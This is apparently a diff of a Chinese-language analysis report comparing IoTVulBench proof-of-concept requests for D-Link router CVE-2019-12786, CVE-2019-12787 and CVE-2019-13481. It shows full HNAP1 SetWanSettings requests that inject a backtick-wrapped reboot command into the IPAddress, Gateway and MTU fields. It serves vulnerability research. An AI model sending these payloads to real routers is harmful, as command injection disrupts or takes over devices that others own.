@@ -21,10 +21,15 @@ firmware: "BM-2024-00083 · D-Link DIR-823G v1.0.2B05"
 ### A 级：CVE-2019-12786 ↔ CVE-2019-12787
 
 <div class="comparison-grid">
+
 <div class="comparison-row">
+
 <section class="poc-card">
+
 <h3>CVE-2019-12786</h3>
+
 <div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-12786/BM-2024-00083-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a>；<a href="https://github.com/TeamSeri0us/pocs/blob/master/iot/dlink/dir818-protected.pdf" target="_blank">NVD 原始引用 PDF ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12786" target="_blank">NVD ↗</a><br>证据等级：基准数据集抓包请求（非原始公开 PoC）；IoTVulBench 将该 CVE 挂在 BM-2024-00083（DIR-823G B05）仿真环境，请求抓自该镜像；本地无 DIR-818LW 固件，未在其上验证。</div>
+
 <pre>
 POST /HNAP1/ HTTP/1.1
 Host: TARGET_HOST:PORT
@@ -44,11 +49,17 @@ Connection: keep-alive
 &nbsp;
 &lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;SetWanSettings xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Type&gt;DHCP&lt;/Type&gt;&lt;PppoeType&gt;&lt;Username&gt;&lt;/Username&gt;&lt;Password&gt;&lt;/Password&gt;&lt;MaxIdleTime&gt;0&lt;/MaxIdleTime&gt;&lt;/PppoeType&gt;&lt;MTU&gt;1400&lt;/MTU&gt;&lt;HostName&gt;&lt;/HostName&gt;&lt;ServiceName&gt;&lt;/ServiceName&gt;&lt;AutoReconnect&gt;false&lt;/AutoReconnect&gt;<mark>&lt;IPAddress&gt;'`reboot`'&lt;/IPAddress&gt;</mark>&lt;SubnetMask&gt;&lt;/SubnetMask&gt;&lt;Gateway&gt;&lt;/Gateway&gt;&lt;DnsManual&gt;false&lt;/DnsManual&gt;&lt;MacCloneEnable&gt;false&lt;/MacCloneEnable&gt;&lt;CloneMacAddress&gt;&lt;/CloneMacAddress&gt;&lt;MacCloneType&gt;&lt;/MacCloneType&gt;&lt;WanSpeed&gt;Auto&lt;/WanSpeed&gt;&lt;WanDuplex&gt;Auto&lt;/WanDuplex&gt;&lt;ConfigDNS&gt;&lt;Primary&gt;&lt;/Primary&gt;&lt;Secondary&gt;&lt;/Secondary&gt;&lt;/ConfigDNS&gt;&lt;MacAddress&gt;&lt;/MacAddress&gt;&lt;VPNServerIPAddress&gt;&lt;/VPNServerIPAddress&gt;&lt;VPNLocalIPAddress&gt;&lt;/VPNLocalIPAddress&gt;&lt;VPNLocalSubnetMask&gt;&lt;/VPNLocalSubnetMask&gt;&lt;VPNLocalGateway&gt;&lt;/VPNLocalGateway&gt;&lt;/SetWanSettings&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
 </pre>
+
 <div>差异高亮：注入位置是 IPAddress。</div>
+
 </section>
+
 <section class="poc-card">
+
 <h3>CVE-2019-12787</h3>
+
 <div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-12787/BM-2024-00083-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a>；<a href="https://github.com/TeamSeri0us/pocs/blob/master/iot/dlink/dir818-2-protected.pdf" target="_blank">NVD 原始引用 PDF ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12787" target="_blank">NVD ↗</a><br>证据等级：基准数据集抓包请求（非原始公开 PoC）；IoTVulBench 将该 CVE 挂在 BM-2024-00083（DIR-823G B05）仿真环境，请求抓自该镜像；本地无 DIR-818LW 固件，未在其上验证。</div>
+
 <pre>
 POST /HNAP1/ HTTP/1.1
 Host: TARGET_HOST:PORT
@@ -68,18 +79,27 @@ Connection: keep-alive
 &nbsp;
 &lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;SetWanSettings xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Type&gt;DHCP&lt;/Type&gt;&lt;PppoeType&gt;&lt;Username&gt;&lt;/Username&gt;&lt;Password&gt;&lt;/Password&gt;&lt;MaxIdleTime&gt;0&lt;/MaxIdleTime&gt;&lt;/PppoeType&gt;&lt;MTU&gt;1400&lt;/MTU&gt;&lt;HostName&gt;&lt;/HostName&gt;&lt;ServiceName&gt;&lt;/ServiceName&gt;&lt;AutoReconnect&gt;false&lt;/AutoReconnect&gt;&lt;IPAddress&gt;&lt;/IPAddress&gt;&lt;SubnetMask&gt;&lt;/SubnetMask&gt;<mark>&lt;Gateway&gt;'`reboot`'&lt;/Gateway&gt;</mark>&lt;DnsManual&gt;false&lt;/DnsManual&gt;&lt;MacCloneEnable&gt;false&lt;/MacCloneEnable&gt;&lt;CloneMacAddress&gt;&lt;/CloneMacAddress&gt;&lt;MacCloneType&gt;&lt;/MacCloneType&gt;&lt;WanSpeed&gt;Auto&lt;/WanSpeed&gt;&lt;WanDuplex&gt;Auto&lt;/WanDuplex&gt;&lt;ConfigDNS&gt;&lt;Primary&gt;&lt;/Primary&gt;&lt;Secondary&gt;&lt;/Secondary&gt;&lt;/ConfigDNS&gt;&lt;MacAddress&gt;&lt;/MacAddress&gt;&lt;VPNServerIPAddress&gt;&lt;/VPNServerIPAddress&gt;&lt;VPNLocalIPAddress&gt;&lt;/VPNLocalIPAddress&gt;&lt;VPNLocalSubnetMask&gt;&lt;/VPNLocalSubnetMask&gt;&lt;VPNLocalGateway&gt;&lt;/VPNLocalGateway&gt;&lt;/SetWanSettings&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
 </pre>
+
 <div>差异高亮：注入位置是 Gateway。</div>
+
 </section>
+
 </div>
+
 </div>
 
 ### A 级：CVE-2019-12786 ↔ CVE-2019-13481
 
 <div class="comparison-grid">
+
 <div class="comparison-row">
+
 <section class="poc-card">
+
 <h3>CVE-2019-12786</h3>
+
 <div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-12786/BM-2024-00083-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a>；<a href="https://github.com/TeamSeri0us/pocs/blob/master/iot/dlink/dir818-protected.pdf" target="_blank">NVD 原始引用 PDF ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12786" target="_blank">NVD ↗</a><br>证据等级：基准数据集抓包请求（非原始公开 PoC）；IoTVulBench 将该 CVE 挂在 BM-2024-00083（DIR-823G B05）仿真环境，请求抓自该镜像；本地无 DIR-818LW 固件，未在其上验证。</div>
+
 <pre>
 POST /HNAP1/ HTTP/1.1
 Host: TARGET_HOST:PORT
@@ -99,11 +119,17 @@ Connection: keep-alive
 &nbsp;
 &lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;SetWanSettings xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Type&gt;DHCP&lt;/Type&gt;&lt;PppoeType&gt;&lt;Username&gt;&lt;/Username&gt;&lt;Password&gt;&lt;/Password&gt;&lt;MaxIdleTime&gt;0&lt;/MaxIdleTime&gt;&lt;/PppoeType&gt;&lt;MTU&gt;1400&lt;/MTU&gt;&lt;HostName&gt;&lt;/HostName&gt;&lt;ServiceName&gt;&lt;/ServiceName&gt;&lt;AutoReconnect&gt;false&lt;/AutoReconnect&gt;<mark>&lt;IPAddress&gt;'`reboot`'&lt;/IPAddress&gt;</mark>&lt;SubnetMask&gt;&lt;/SubnetMask&gt;&lt;Gateway&gt;&lt;/Gateway&gt;&lt;DnsManual&gt;false&lt;/DnsManual&gt;&lt;MacCloneEnable&gt;false&lt;/MacCloneEnable&gt;&lt;CloneMacAddress&gt;&lt;/CloneMacAddress&gt;&lt;MacCloneType&gt;&lt;/MacCloneType&gt;&lt;WanSpeed&gt;Auto&lt;/WanSpeed&gt;&lt;WanDuplex&gt;Auto&lt;/WanDuplex&gt;&lt;ConfigDNS&gt;&lt;Primary&gt;&lt;/Primary&gt;&lt;Secondary&gt;&lt;/Secondary&gt;&lt;/ConfigDNS&gt;&lt;MacAddress&gt;&lt;/MacAddress&gt;&lt;VPNServerIPAddress&gt;&lt;/VPNServerIPAddress&gt;&lt;VPNLocalIPAddress&gt;&lt;/VPNLocalIPAddress&gt;&lt;VPNLocalSubnetMask&gt;&lt;/VPNLocalSubnetMask&gt;&lt;VPNLocalGateway&gt;&lt;/VPNLocalGateway&gt;&lt;/SetWanSettings&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
 </pre>
+
 <div>差异高亮：完整原始 XML 见下方链接；注入字段是 IPAddress。</div>
+
 </section>
+
 <section class="poc-card">
+
 <h3>CVE-2019-13481</h3>
+
 <div>原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-13481/BM-2024-00083-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a>；<a href="https://github.com/TeamSeri0us/pocs/blob/master/iot/dlink/dir818-3-protected.pdf" target="_blank">NVD 原始引用 PDF ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-13481" target="_blank">NVD ↗</a><br>证据等级：基准数据集抓包请求（非原始公开 PoC）；IoTVulBench 将该 CVE 挂在 BM-2024-00083（DIR-823G B05）仿真环境，请求抓自该镜像；本地无 DIR-818LW 固件，未在其上验证。</div>
+
 <pre>
 POST /HNAP1/ HTTP/1.1
 Host: TARGET_HOST:PORT
@@ -123,9 +149,13 @@ Connection: keep-alive
 &nbsp;
 &lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;SetWanSettings xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Type&gt;DHCP&lt;/Type&gt;&lt;PppoeType&gt;&lt;Username&gt;&lt;/Username&gt;&lt;Password&gt;&lt;/Password&gt;&lt;MaxIdleTime&gt;0&lt;/MaxIdleTime&gt;&lt;/PppoeType&gt;<mark>&lt;MTU&gt;'`reboot`'&lt;/MTU&gt;</mark>&lt;HostName&gt;&lt;/HostName&gt;&lt;ServiceName&gt;&lt;/ServiceName&gt;&lt;AutoReconnect&gt;false&lt;/AutoReconnect&gt;&lt;IPAddress&gt;&lt;/IPAddress&gt;&lt;SubnetMask&gt;&lt;/SubnetMask&gt;&lt;Gateway&gt;&lt;/Gateway&gt;&lt;DnsManual&gt;false&lt;/DnsManual&gt;&lt;MacCloneEnable&gt;false&lt;/MacCloneEnable&gt;&lt;CloneMacAddress&gt;&lt;/CloneMacAddress&gt;&lt;MacCloneType&gt;&lt;/MacCloneType&gt;&lt;WanSpeed&gt;Auto&lt;/WanSpeed&gt;&lt;WanDuplex&gt;Auto&lt;/WanDuplex&gt;&lt;ConfigDNS&gt;&lt;Primary&gt;&lt;/Primary&gt;&lt;Secondary&gt;&lt;/Secondary&gt;&lt;/ConfigDNS&gt;&lt;MacAddress&gt;&lt;/MacAddress&gt;&lt;VPNServerIPAddress&gt;&lt;/VPNServerIPAddress&gt;&lt;VPNLocalIPAddress&gt;&lt;/VPNLocalIPAddress&gt;&lt;VPNLocalSubnetMask&gt;&lt;/VPNLocalSubnetMask&gt;&lt;VPNLocalGateway&gt;&lt;/VPNLocalGateway&gt;&lt;/SetWanSettings&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;
 </pre>
+
 <div>差异高亮：Content-Length 变为 1028，注入字段是 MTU。</div>
+
 </section>
+
 </div>
+
 </div>
 
 ## 三条请求的判定
